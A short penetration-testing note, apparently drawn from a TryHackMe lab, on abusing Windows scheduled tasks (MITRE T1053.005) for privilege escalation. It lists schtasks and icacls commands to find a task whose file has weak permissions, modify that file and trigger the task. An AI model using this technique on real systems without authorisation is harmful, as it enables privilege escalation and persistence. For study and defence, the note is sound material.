# Overview
MITRE ATT&CK 
Tactic: Execution, Persistence, Privilege Escalation
Technique ID (2023): T1053.005
Technique: Schedule Task/Job
Sub-Technique: Scheduled Task

tags: #execution, #persistence, #privilegeEscalation, #scheduledTask, #windows


# Description

Identify scheduled tasks that have a task to run which is a filename.  Evaluate the permissions of the file.  Due to incorrect acls on the file you are able to modify it and run and gain access as the user setup as the "Run as User"

# References:
Tryhackme - Windows Privilege Escalation

References: https://www.linkedin.com/pulse/lolbin-attacks-scheduled-tasks-t1503005-how-detect-them-v%C3%B6gele



# Commands to Exploit

Run a query using schtasks as the task name and format the output as a list...
```cmd
schtasks /query /tn vulntask /fo list /v
```

Execute the command to evaluate the ACLs of the file displayed in the "Task to Run"
```cmd
icacls c:\tasks\schtask.bat
```

After modifying the file you can manually execute by running the following
```cmd
schtasks /run /tn vulntask
```


